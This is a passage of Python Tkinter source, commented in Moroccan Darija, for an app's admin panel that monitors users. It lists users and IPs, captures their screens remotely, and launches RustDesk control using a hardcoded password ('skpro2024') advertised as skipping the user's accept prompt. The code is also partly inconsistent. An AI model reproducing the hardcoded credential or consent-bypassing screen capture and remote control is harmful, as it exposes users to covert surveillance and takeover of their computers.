                  command=lambda: self._copy_text(f"Username: {client_name}\nPassword: {gen_pass}"),
                  padx=12, pady=6).pack(side="left", padx=5)
        
        tk.Button(btns, text="❌ Close",
                  bg=C["red"], fg="white",
                  font=("Segoe UI", 9, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=modal.destroy,
                  padx=12, pady=6).pack(side="right", padx=5)
    
    def _copy_text(self, text):
        """Copy text l clipboard"""
        try:
            self.clipboard_clear()
            self.clipboard_append(text)
            self.update()
        except:
            pass


class LiveMonitorTab(tk.Frame):
    """Tab dyal admin: watch all users live + control them remotely"""
    
    def __init__(self, parent, app):
        super().__init__(parent, bg=C["bg0"])
        self.app = app
        self.server_client = ServerClient(role="admin")
        self.selected_user = None
        self.last_log_id = 0
        self.user_logs_cache = {}
        self._refresh_job = None
        
        # Ila server mafichi configured → show setup screen
        if not self.server_client.enabled:
            self._build_setup_screen()
        else:
            self._build_ui()
            self._start_auto_refresh()
    
    def _build_setup_screen(self):
        """Show 'configure server first' screen"""
        # Center container
        container = tk.Frame(self, bg=C["bg0"])
        container.place(relx=0.5, rely=0.5, anchor="center")
        
        # Big icon
        tk.Label(container, text="🌐", bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 64)).pack(pady=(0, 10))
        
        tk.Label(container, text="Live Monitor Not Configured",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 18, "bold")).pack()
        
        tk.Label(container,
                 text="Bach tsta3ml had l'feature, khasak server.json m3a Railway URL + API keys",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 10), wraplength=600).pack(pady=(8, 25))
        
        # Steps card
        steps = tk.Frame(container, bg=C["bg1"])
        steps.pack(fill="x", padx=40, pady=10)
        
        steps_text = (
            "📋 SETUP STEPS:\n\n"
            "  1️⃣ Cr3a account f Railway.app (b GitHub - free)\n"
            "  2️⃣ Push folder 'server/' l GitHub (private repo)\n"
            "  3️⃣ Deploy mn Railway → choose your repo\n"
            "  4️⃣ Add 2 env vars: ADMIN_API_KEY + USER_API_KEY\n"
            "  5️⃣ Generate domain → copy URL\n"
            "  6️⃣ Cr3a server.json next l 20.py:\n"
            "         {\n"
            "           \"server_url\": \"https://xxx.up.railway.app\",\n"
            "           \"admin_api_key\": \"YOUR_ADMIN_KEY\",\n"
            "           \"user_api_key\": \"YOUR_USER_KEY\"\n"
            "         }\n"
            "  7️⃣ Restart l'app\n"
        )
        tk.Label(steps, text=steps_text,
                 bg=C["bg1"], fg=C["text"],
                 font=("Consolas", 10), justify="left").pack(padx=20, pady=15, anchor="w")
        
        # Action buttons
        btn_frame = tk.Frame(container, bg=C["bg0"])
        btn_frame.pack(pady=15)
        
        tk.Button(btn_frame, text="📖 Open Setup Guide",
                  bg=C["accent"], fg="white",
                  font=("Segoe UI", 11, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._open_guide).pack(side="left", padx=5, ipadx=20, ipady=10)
        
        tk.Button(btn_frame, text="📝 Cr3a server.json",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 11, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._create_config).pack(side="left", padx=5, ipadx=20, ipady=10)
        
        tk.Button(btn_frame, text="🔄 Reload",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 11),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._reload).pack(side="left", padx=5, ipadx=20, ipady=10)
    
    def _open_guide(self):
        """Show full setup guide"""
        ServerSetupGuideDialog(self)
    
    def _create_config(self):
        """Open dialog to create server.json"""
        ServerConfigDialog(self, on_save=self._reload)
    
    def _reload(self):
        """Reload app after config change"""
        from tkinter import messagebox
        messagebox.showinfo(
            "🔄 Reload Required",
            "Bach changes ki-9adlou, khasak tlani mn jdid l'app.\n\n"
            "Click Logout → Login mn jdid.",
            parent=self
        )
    
    def _build_ui(self):
        # Header
        header = tk.Frame(self, bg=C["bg0"])
        header.pack(fill="x", padx=15, pady=10)
        tk.Label(header, text="🌐 Live Monitor",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(side="left")
        
        # Server status
        self.status_lbl = tk.Label(header, text="● Connecting...",
                                    bg=C["bg0"], fg=C["yellow"],
                                    font=("Segoe UI", 9, "bold"))
        self.status_lbl.pack(side="left", padx=15)
        
        tk.Button(header, text="🔄 Refresh Now",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 9),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._refresh_users).pack(side="right", padx=5, ipadx=10, ipady=5)
        
        # Auto-refresh toggle
        self.auto_refresh = tk.BooleanVar(value=True)
        tk.Checkbutton(header, text="Auto refresh (5s)",
                       variable=self.auto_refresh,
                       bg=C["bg0"], fg=C["text"],
                       selectcolor=C["bg2"],
                       activebackground=C["bg0"],
                       font=("Segoe UI", 9)).pack(side="right", padx=10)
        
        # Split: top = users list, bottom = logs
        paned = tk.PanedWindow(self, orient="vertical", bg=C["bg0"],
                               sashwidth=6, sashrelief="flat")
        paned.pack(fill="both", expand=True, padx=15, pady=(0, 10))
        
        # Top: Users tree
        users_frame = tk.Frame(paned, bg=C["bg1"])
        paned.add(users_frame, minsize=200)
        
        tk.Label(users_frame, text="👥 Connected Users",
                 bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=10, pady=8)
        
        tree_container = tk.Frame(users_frame, bg=C["bg1"])
        tree_container.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        cols = ("status", "username", "last_seen", "ip", "expires", "activity")
        self.tree = ttk.Treeview(tree_container, columns=cols, show="headings", height=8)
        self.tree.heading("status", text="●")
        self.tree.heading("username", text="👤 Username")
        self.tree.heading("last_seen", text="🕐 Last Seen")
        self.tree.heading("ip", text="🌐 IP")
        self.tree.heading("expires", text="⏰ Expires")
        self.tree.heading("activity", text="📊 Status")
        self.tree.column("status", width=40, anchor="center")
        self.tree.column("username", width=140)
        self.tree.column("last_seen", width=110)
        self.tree.column("ip", width=120)
        self.tree.column("expires", width=140)
        self.tree.column("activity", width=100)
        self.tree.pack(side="left", fill="both", expand=True)
        
        sb = ttk.Scrollbar(tree_container, orient="vertical", command=self.tree.yview)
        sb.pack(side="right", fill="y")
        self.tree.config(yscrollcommand=sb.set)
        
        self.tree.bind("<<TreeviewSelect>>", self._on_user_select)
        
        # Action buttons
        actions = tk.Frame(users_frame, bg=C["bg1"])
        actions.pack(fill="x", padx=10, pady=(0, 8))
        
        tk.Button(actions, text="⏰ Extend Time",
                  bg=C["green"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._extend_time).pack(side="left", padx=4, ipadx=10, ipady=5)
        tk.Button(actions, text="🔌 Disconnect",
                  bg=C["yellow"], fg="black",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._disconnect_user).pack(side="left", padx=4, ipadx=10, ipady=5)
        tk.Button(actions, text="🚫 Block",
                  bg=C["red"], fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._block_user).pack(side="left", padx=4, ipadx=10, ipady=5)
        tk.Button(actions, text="✅ Unblock",
                  bg=C["accent2"] if "accent2" in C else "#0ea5e9", fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._unblock_user).pack(side="left", padx=4, ipadx=10, ipady=5)
        tk.Button(actions, text="👁 Watch Screen",
                  bg="#9333ea", fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._watch_screen).pack(side="left", padx=4, ipadx=10, ipady=5)
        tk.Button(actions, text="📸 Screenshot",
                  bg="#0891b2", fg="white",
                  font=("Segoe UI", 10, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._take_screenshot).pack(side="left", padx=4, ipadx=10, ipady=5)
        
        # Bottom: Live logs
        logs_frame = tk.Frame(paned, bg=C["bg1"])
        paned.add(logs_frame, minsize=200)
        
        log_header = tk.Frame(logs_frame, bg=C["bg1"])
        log_header.pack(fill="x", padx=10, pady=8)
        self.log_title = tk.Label(log_header, text="📜 Live Activity (all users)",
                                   bg=C["bg1"], fg=C["text"],
                                   font=("Segoe UI", 10, "bold"))
        self.log_title.pack(side="left")
        tk.Button(log_header, text="🗑 Clear",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 8),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._clear_logs).pack(side="right", padx=5, ipadx=8)
        
        log_container = tk.Frame(logs_frame, bg=C["bg2"])
        log_container.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        self.log_text = tk.Text(log_container, bg=C["bg2"], fg=C["text"],
                                 font=("Consolas", 9),
                                 relief="flat", bd=0,
                                 padx=8, pady=6,
                                 wrap="word",
                                 state="disabled")
        self.log_text.pack(side="left", fill="both", expand=True)
        
        log_sb = ttk.Scrollbar(log_container, orient="vertical", command=self.log_text.yview)
        log_sb.pack(side="right", fill="y")
        self.log_text.config(yscrollcommand=log_sb.set)
    
    def _on_user_select(self, event=None):
        sel = self.tree.selection()
        if sel:
            self.selected_user = self.tree.item(sel[0])["values"][1]
            self.log_title.config(text=f"📜 Live Activity — {self.selected_user}")
            # Refresh logs filtered
            self._refresh_logs(reset=True)
        else:
            self.selected_user = None
            self.log_title.config(text="📜 Live Activity (all users)")
    
    def _start_auto_refresh(self):
        def _refresh():
            if self.auto_refresh.get():
                self._refresh_users()
                self._refresh_logs()
            self._refresh_job = self.after(5000, _refresh)
        self._refresh_job = self.after(1000, _refresh)
    
    def _refresh_users(self):
        """Refresh users list mn server"""
        if not self.server_client.enabled:
            self.status_lbl.config(text="● Server not configured", fg=C["red"])
            return
        
        # Run f thread
        import threading
        threading.Thread(target=self._fetch_users_thread, daemon=True).start()
    
    def _fetch_users_thread(self):
        users = self.server_client.list_users()
        self.after(0, lambda: self._update_users_tree(users))
    
    def _update_users_tree(self, users):
        if users is None:
            self.status_lbl.config(text="● Server unreachable", fg=C["red"])
            return
        
        self.status_lbl.config(text=f"● Connected ({len(users)} users)", fg=C["green"])
        
        # Save selection
        sel_username = self.selected_user
        
        # Clear tree
        for iid in self.tree.get_children():
            self.tree.delete(iid)
        
        from datetime import datetime
        now = int(time.time())
        
        for u in users:
            # Status icon
            online = u.get("online", False)
            blocked = u.get("blocked", False)
            if blocked:
                status = "🚫"
            elif online:
                status = "🟢"
            else:
                status = "⚪"
            
            # Last seen
            last_seen = u.get("last_seen") or 0
            secs = u.get("seconds_since_seen") or 0
            if secs < 60:
                last_seen_str = f"{secs}s ago"
            elif secs < 3600:
                last_seen_str = f"{secs // 60}m ago"
            elif secs < 86400:
                last_seen_str = f"{secs // 3600}h ago"
            else:
                last_seen_str = datetime.fromtimestamp(last_seen).strftime("%Y-%m-%d")
            
            # Expires
            exp = u.get("expires_at")
            if exp is None:
                exp_str = "♾ Never"
            elif now > exp:
                exp_str = "⛔ EXPIRED"
            else:
                diff = exp - now
                if diff < 3600:
                    exp_str = f"⚠ {diff//60}m left"
                elif diff < 86400:
                    exp_str = f"⚠ {diff//3600}h left"
                else:
                    exp_str = datetime.fromtimestamp(exp).strftime("%Y-%m-%d")
            
            activity = u.get("current_status", "—")
            ip = u.get("ip_address", "—") or "—"
            
            iid = self.tree.insert("", "end", values=(
                status, u["username"], last_seen_str, ip, exp_str, activity))
            
            # Restore selection
            if u["username"] == sel_username:
                self.tree.selection_set(iid)
    
    def _refresh_logs(self, reset=False):
        if not self.server_client.enabled:
            return
        if reset:
            self.last_log_id = 0
            self.log_text.configure(state="normal")
            self.log_text.delete("1.0", "end")
            self.log_text.configure(state="disabled")
        
        import threading
        threading.Thread(target=self._fetch_logs_thread, daemon=True).start()
    
    def _fetch_logs_thread(self):
        logs = self.server_client.get_logs(
            username=self.selected_user, limit=50,
            since=self.last_log_id if self.last_log_id else None
        )
        if logs:
            self.after(0, lambda: self._append_logs(logs))
    
    def _append_logs(self, logs):
        from datetime import datetime
        # Logs come reversed (newest first), reverse
        logs = list(reversed(logs))
        self.log_text.configure(state="normal")
        for log in logs:
            ts = datetime.fromtimestamp(log["timestamp"]).strftime("%H:%M:%S")
            level = log.get("level", "info")
            user = log.get("username", "?")
            msg = log.get("message", "")
            
            # Color tag
            tag = f"lvl_{level}"
            color_map = {
                "error": C["red"],
                "warning": C["yellow"],
                "success": C["green"],
                "info": C["text2"],
            }
            self.log_text.tag_config(tag, foreground=color_map.get(level, C["text2"]))
            
            line = f"{ts}  [{user}]  {msg}\n"
            self.log_text.insert("end", line, tag)
            
            # Track latest id
            if log.get("id"):
                self.last_log_id = max(self.last_log_id, int(log["id"]) - 1)
        self.log_text.see("end")
        self.log_text.configure(state="disabled")
    
    def _clear_logs(self):
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")
    
    def _get_selected(self):
        from tkinter import messagebox
        if not self.selected_user:
            messagebox.showwarning("No Selection", "Khtar user lawl", parent=self)
            return None
        return self.selected_user
    
    def _extend_time(self):
        from tkinter import messagebox, simpledialog
        username = self._get_selected()
        if not username:
            return
        
        # Choose extension
        choice = ExtendTimeDialog(self, username)
        self.wait_window(choice)
        if choice.result_seconds is None:
            return
        
        result = self.server_client.extend_user(username, choice.result_seconds)
        if result:
            from datetime import datetime
            new_exp = result.get("new_expires_at")
            if new_exp:
                exp_str = datetime.fromtimestamp(new_exp).strftime("%Y-%m-%d %H:%M")
                messagebox.showinfo("✅ Extended",
                    f"User '{username}' wsel l: {exp_str}",
                    parent=self)
            self._refresh_users()
        else:
            messagebox.showerror("❌", "Failed to extend time", parent=self)
    
    def _disconnect_user(self):
        from tkinter import messagebox
        username = self._get_selected()
        if not username:
            return
        if not messagebox.askyesno("Confirm",
            f"Force disconnect '{username}'?\n\nL'app dyalo ghadi tetsedd.",
            parent=self):
            return
        result = self.server_client.disconnect_user(username, "Admin requested")
        if result:
            messagebox.showinfo("✅", f"Disconnect requested. User ghadi yetsedd f next heartbeat (30s)",
                                parent=self)
        else:
            messagebox.showerror("❌", "Failed", parent=self)
    
    def _block_user(self):
        from tkinter import messagebox
        username = self._get_selected()
        if not username:
            return
        if not messagebox.askyesno("Confirm Block",
            f"Block '{username}'?\n\nMa ghadi y9derch yloggini ta admin yunblockih.",
            parent=self):
            return
        result = self.server_client.block_user(username, blocked=True)
        if result:
            self._refresh_users()
            messagebox.showinfo("✅", f"User '{username}' blocked", parent=self)
    
    def _unblock_user(self):
        from tkinter import messagebox
        username = self._get_selected()
        if not username:
            return
        result = self.server_client.block_user(username, blocked=False)
        if result:
            # Also clear disconnect flag
            self.server_client.clear_disconnect(username)
            self._refresh_users()
            messagebox.showinfo("✅", f"User '{username}' unblocked", parent=self)
    
    def _watch_screen(self):
        """Open screen viewer window dyal user li selected"""
        from tkinter import messagebox
        username = self._get_selected()
        if not username:
            return
        
        # Check ila Pillow available (l screenshot rendering)
        try:
            from PIL import Image, ImageTk
        except ImportError:
            messagebox.showerror(
                "❌ Missing Library",
                "Khasak install Pillow:\n\npip install Pillow",
                parent=self
            )
            return
        
        # Open viewer window
        ScreenViewerWindow(self, self.server_client, username)
    
    def _auto_open_watch_screen(self):
        """Auto-open Watch Screen when user logs in (background)"""
        username = self.current_user.get("username")
        if not username or self.current_user.get("role") != "user":
            return
        
        try:
            from PIL import Image, ImageTk
        except ImportError:
            # Pillow ma kaynch — skip auto-watch
            return
        
        # Create a hidden/minimal ScreenViewerWindow l background
        # But direct show it to user
        try:
            # Get server client
            if not hasattr(self, "_server_client") or not self._server_client:
                return
            
            # Open Watch Screen (user side — self-watch)
            ScreenViewerWindow(self, self._server_client, username)
        except Exception as e:
            print(f"⚠ Auto-watch error: {e}")
    
    
    def _take_screenshot(self):
        """Take screenshot dyal user screen + save l file"""
        from tkinter import messagebox, filedialog
        username = self._get_selected()
        if not username:
            return
        
        try:
            import threading
            
            def _capture_thread():
                try:
                    # Trigger watch (signal user to capture)
                    self.server_client.start_watching(username)
                    
                    # Wait briefly for fresh screenshot
                    import time
                    time.sleep(2)
                    
                    # Get latest screenshot
                    image_b64 = self.server_client.get_latest_screenshot(username)
                    
                    # Stop watching
                    self.server_client.stop_watching(username)
                    
                    if not image_b64:
                        self.after(0, lambda: messagebox.showwarning(
                            "⚠ No Screenshot",
                            f"User '{username}' machi online wla machi ki-y-sift screen.\n"
                            "Khasak user ykon online + machi blocked.",
                            parent=self
                        ))
                        return
                    
                    # Decode + save
                    import base64
                    image_bytes = base64.b64decode(image_b64)
                    
                    # Default filename
                    from datetime import datetime
                    default_name = f"screenshot_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    
                    # Save dialog (in main thread)
                    def _save():
                        path = filedialog.asksaveasfilename(
                            defaultextension=".jpg",
                            initialfile=default_name,
                            filetypes=[("JPEG", "*.jpg"), ("PNG", "*.png"), ("All", "*.*")],
                            parent=self
                        )
                        if path:
                            with open(path, "wb") as f:
                                f.write(image_bytes)
                            messagebox.showinfo(
                                "✅ Screenshot Saved",
                                f"Saved as:\n{path}",
                                parent=self
                            )
                    
                    self.after(0, _save)
                except Exception as e:
                    self.after(0, lambda: messagebox.showerror(
                        "Error",
                        f"Couldn't take screenshot:\n{e}",
                        parent=self
                    ))
            
            threading.Thread(target=_capture_thread, daemon=True).start()
        except Exception as e:
            messagebox.showerror("Error", str(e), parent=self)
    
    def _remote_control(self):
        """Open Remote Control dialog (legacy, machi fonctionnel)"""
        from tkinter import messagebox
        messagebox.showinfo(
            "ℹ Info",
            "Remote control disabled.\nUse '👁 Watch Screen' instead.",
            parent=self
        )


class AnyDeskInstallDialog(tk.Toplevel):
    """Dialog l user bach yinstaller AnyDesk (mli machi installed)"""
    
    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        
        self.title("🖥 Remote Control Setup")
        self.geometry("550x500")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        
        # Make sure dialog stays on top
        self.attributes("-topmost", True)
        self.lift()
        
        self.update_idletasks()
        w, h = 550, 500
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
        
        self._build_ui()
        self._start_check_loop()
    
    def _build_ui(self):
        # Bottom buttons
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=20, pady=15)
        
        self.status = tk.Label(bottom, text="🔍 Checking AnyDesk installation...",
                                bg=C["bg0"], fg=C["yellow"],
                                font=("Segoe UI", 9, "bold"))
        self.status.pack(pady=(0, 10))
        
        btn_row = tk.Frame(bottom, bg=C["bg0"])
        btn_row.pack(fill="x")
        
        tk.Button(btn_row, text="❌ Skip",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 10),
                  relief="flat", bd=0, cursor="hand2",
                  command=self.destroy).pack(side="left", expand=True, fill="x",
                                              padx=(0, 4), ipady=10)
        
        tk.Button(btn_row, text="📥 Install AnyDesk Now",
                  bg="#dc2626", fg="white",
                  font=("Segoe UI", 11, "bold"),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._open_download).pack(side="left", expand=True, fill="x",
                                                     padx=(4, 0), ipady=10)
        
        # Header
        tk.Label(self, text="🖥",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 48)).pack(pady=(20, 5))
        
        tk.Label(self, text="Remote Control Setup",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack()
        
        tk.Label(self, text="AnyDesk khasso yt-installed",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 10)).pack(pady=(2, 15))
        
        # Info card
        card = tk.Frame(self, bg=C["bg1"])
        card.pack(fill="x", padx=30, pady=10)
        
        tk.Label(card, text="📋 Steps:",
                 bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(15, 5))
        
        steps_text = (
            "1️⃣  Click '📥 Install AnyDesk Now' button\n"
            "2️⃣  Browser ghadi yfdar AnyDesk website\n"
            "3️⃣  Click 'Download Now' (~3 MB)\n"
            "4️⃣  Run l'installer li download-i\n"
            "5️⃣  Click 'Install' f AnyDesk window\n"
            "6️⃣  Done! App ki-detect automatique"
        )
        tk.Label(card, text=steps_text,
                 bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI", 10), justify="left",
                 anchor="w").pack(fill="x", padx=15, pady=(0, 15))
        
        # Why
        why = tk.Label(self,
                       text="💡 3lach? Bach admin yqd y3awnk f remote support",
                       bg=C["bg0"], fg=C["text2"],
                       font=("Segoe UI", 9, "italic"))
        why.pack(pady=5)
    
    def _open_download(self):
        """Open AnyDesk download website"""
        import webbrowser
        webbrowser.open("https://anydesk.com/download")
        self.status.config(
            text="🌐 Browser opened — install AnyDesk + 3awd had window ghadi tetferma auto",
            fg=C["green"]
        )
    
    def _start_check_loop(self):
        """Check kol 3 secondes ila AnyDesk installed"""
        def _check():
            if AnyDeskManager.is_installed():
                self.status.config(text="✅ AnyDesk detected! Closing...", fg=C["green"])
                self.after(2000, self.destroy)
                return
            self.after(3000, _check)
        
        self.after(3000, _check)


class AnyDeskRemoteDialog(tk.Toplevel):
    """Dialog dyal admin bach y9ad AnyDesk m3a user"""
    
    def __init__(self, parent, server_client, username):
        super().__init__(parent)
        self.server_client = server_client
        self.username = username
        
        self.title(f"🖥 Remote Control — {username}")
        self.geometry("520x500")
        self.configure(bg=C["bg0"])
        self.resizable(False, False)
        self.transient(parent)
        self.grab_set()
        
        self.update_idletasks()
        w, h = 520, 500
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
        
        self._build_ui()
        self._fetch_anydesk_id()
    
    def _build_ui(self):
        # Bottom buttons
        bottom = tk.Frame(self, bg=C["bg0"])
        bottom.pack(side="bottom", fill="x", padx=20, pady=15)
        
        self.status = tk.Label(bottom, text="", bg=C["bg0"], fg=C["text2"],
                                font=("Segoe UI", 9))
        self.status.pack(pady=(0, 8))
        
        btn_row = tk.Frame(bottom, bg=C["bg0"])
        btn_row.pack(fill="x")
        tk.Button(btn_row, text="❌ Close",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 10),
                  relief="flat", bd=0, cursor="hand2",
                  command=self.destroy).pack(side="left", expand=True, fill="x",
                                              padx=(0, 4), ipady=8)
        self.connect_btn = tk.Button(btn_row, text="🚀 Connect (RustDesk)",
                                      bg="#dc2626", fg="white",
                                      font=("Segoe UI", 11, "bold"),
                                      relief="flat", bd=0, cursor="hand2",
                                      state="disabled",
                                      command=self._do_connect)
        self.connect_btn.pack(side="left", expand=True, fill="x",
                               padx=(4, 0), ipady=10)
        
        # Header
        tk.Label(self, text="🖥 Remote Desktop Control",
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 16, "bold")).pack(pady=(20, 5))
        tk.Label(self, text=f"User: 👤 {self.username}",
                 bg=C["bg0"], fg=C["text"],
                 font=("Segoe UI", 11)).pack(pady=(0, 15))
        
        # Info card
        card = tk.Frame(self, bg=C["bg1"])
        card.pack(fill="x", padx=30, pady=10)
        
        # AnyDesk ID
        tk.Label(card, text="🆔 RustDesk ID:",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=15, pady=(15, 2))
        
        self.id_lbl = tk.Label(card, text="⏳ Loading...",
                                bg=C["bg2"], fg=C["accent"],
                                font=("Consolas", 16, "bold"))
        self.id_lbl.pack(fill="x", padx=15, ipady=10)
        
        # Copy button
        copy_frame = tk.Frame(card, bg=C["bg1"])
        copy_frame.pack(fill="x", padx=15, pady=8)
        tk.Button(copy_frame, text="📋 Copy ID",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 9),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._copy_id).pack(side="left", padx=2, ipadx=10, ipady=4)
        tk.Button(copy_frame, text="🔄 Refresh",
                  bg=C["bg2"], fg=C["text"],
                  font=("Segoe UI", 9),
                  relief="flat", bd=0, cursor="hand2",
                  command=self._fetch_anydesk_id).pack(side="left", padx=2, ipadx=10, ipady=4)
        
        # Note
        tk.Label(card, text="ℹ Hadshi AnyDesk ID dyal user — copyha\nwla click 'Connect' bach y9ad direct",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9), justify="left").pack(anchor="w", padx=15, pady=(0, 15))
        
        # Instructions
        tk.Label(self, text="📋 Kifash khdmtu:",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=30, pady=(10, 5))
        
        inst = tk.Label(self,
            text="1. Click '🚀 Connect (RustDesk)' f la7t\n"
                 "2. AnyDesk dyalk ki-tfdar m3a ID dyal user\n"
                 "3. User khasso y3ti permission (yclick Accept)\n"
                 "4. Daba 3ndk full control 3la PC dyalo",
            bg=C["bg0"], fg=C["text"],
            font=("Segoe UI", 9), justify="left", anchor="w")
        inst.pack(anchor="w", padx=30, pady=(0, 5))
    
    def _fetch_anydesk_id(self):
        """Fetch AnyDesk ID mn server"""
        self.id_lbl.config(text="⏳ Loading...", fg=C["yellow"])
        self.status.config(text="", fg=C["text2"])
        self.connect_btn.config(state="disabled")
        
        import threading
        threading.Thread(target=self._fetch_thread, daemon=True).start()
    
    def _fetch_thread(self):
        try:
            result = self.server_client.get_anydesk(self.username)
            anydesk_id = result.get("anydesk_id") if result else None
            self.after(0, lambda: self._update_id(anydesk_id))
        except Exception as e:
            self.after(0, lambda: self._update_id(None, error=str(e)))
    
    def _update_id(self, anydesk_id, error=None):
        if error:
            self.id_lbl.config(text="❌ Error", fg=C["red"])
            self.status.config(text=f"⚠ {error[:80]}", fg=C["red"])
        elif anydesk_id:
            self.id_lbl.config(text=anydesk_id, fg=C["accent"])
            self.connect_btn.config(state="normal")
            self.status.config(text="✅ Ready to connect", fg=C["green"])
        else:
            self.id_lbl.config(text="⚠ Not registered", fg=C["yellow"])
            self.status.config(
                text="User ba9i ma sift ID. Khasso ydir login + AnyDesk install",
                fg=C["yellow"]
            )
    
    def _copy_id(self):
        anydesk_id = self.id_lbl.cget("text")
        if anydesk_id and not anydesk_id.startswith(("⏳", "⚠", "❌")):
            self.clipboard_clear()
            self.clipboard_append(anydesk_id.replace(" ", ""))
            self.status.config(text="📋 Copied to clipboard!", fg=C["green"])
    
    def _do_connect(self):
        """Open RustDesk client m3a ID dyal user"""
        from tkinter import messagebox
        rd_id = self.id_lbl.cget("text")
        if not rd_id or rd_id.startswith(("⏳", "⚠", "❌")):
            return
        
        # Clean ID (remove spaces)
        clean_id = rd_id.replace(" ", "")
        
        # Auto-install RustDesk f admin PC ila ma kayn
        if not RustDeskManager.is_installed():
            if not messagebox.askyesno(
                "🔧 RustDesk Setup",
                "RustDesk machi installed f l'PC dyalk.\n\n"
                "Wash baghi n-installah AUTO daba? (~25 MB)\n\n"
                "Click YES = auto-install\n"
                "Click NO = ouvri website manual",
                parent=self
            ):
                import webbrowser
                webbrowser.open("https://rustdesk.com/")
                return
            
            # Auto-install
            self.status.config(text="⏳ Installing RustDesk...", fg=C["yellow"])
            self.update()
            
            import threading
            def _install_thread():
                ok = RustDeskManager.install_silent(
                    on_progress=lambda msg: self.after(0,
                        lambda: self.status.config(text=msg, fg=C["yellow"]))
                )
                if ok:
                    self.after(0, lambda: self._launch_rustdesk(clean_id))
                else:
                    self.after(0, lambda: messagebox.showerror(
                        "Install failed",
                        "Couldn't install RustDesk auto.\nDownload manual:\nhttps://rustdesk.com/",
                        parent=self
                    ))
            
            threading.Thread(target=_install_thread, daemon=True).start()
            return
        
        # Already installed → launch
        self._launch_rustdesk(clean_id)
    
    def _launch_rustdesk(self, clean_id):
        """Launch RustDesk client w connect direct"""
        from tkinter import messagebox
        try:
            exe = RustDeskManager.find_executable()
            # Connect direct b ID
            subprocess.Popen([exe, "--connect", clean_id])
            self.status.config(
                text="🚀 RustDesk launched! Auto-connecting with password",
                fg=C["green"]
            )
            messagebox.showinfo(
                "🔐 Connection Info",
                f"RustDesk launching m3a ID: {clean_id}\n\n"
                f"🔑 Password: skpro2024\n\n"
                f"Ila ki-7tah password, copyi w paste:\n"
                f"   skpro2024\n\n"
                f"⚡ Bla user accept popup!",
                parent=self
            )
        except Exception as e:
            messagebox.showerror("Error", f"Couldn't launch RustDesk:\n{e}", parent=self)


class ScreenViewerWindow(tk.Toplevel):
    """Window dyal admin bach yshof screen dyal user real-time"""
    
    def __init__(self, parent, server_client, username):
        super().__init__(parent)
        self.server_client = server_client
        self.username = username
        self._running = False
        self._refresh_job = None
        self._photo = None  # Reference bach Tkinter ma garbage-collectich
        
        self.title(f"👁 Watching: {username}")
        self.geometry("1280x800")
        self.configure(bg=C["bg0"])
        
        self.update_idletasks()
        w, h = 1280, 800
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        if w > sw - 40: w = sw - 40
        if h > sh - 40: h = sh - 40
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")
        
        self._build_ui()
        self._start_watching()
        
        self.protocol("WM_DELETE_WINDOW", self._on_close)
    
    def _build_ui(self):
        # Top bar
        top = tk.Frame(self, bg=C["bg1"])
        top.pack(fill="x")
        
        tk.Label(top, text=f"👁 Live Screen — {self.username}",
                 bg=C["bg1"], fg=C["accent"],
                 font=("Segoe UI", 13, "bold")).pack(side="left", padx=15, pady=10)
        
        self.status_lbl = tk.Label(top, text="● Connecting...",
                                    bg=C["bg1"], fg=C["yellow"],
                                    font=("Segoe UI", 9, "bold"))
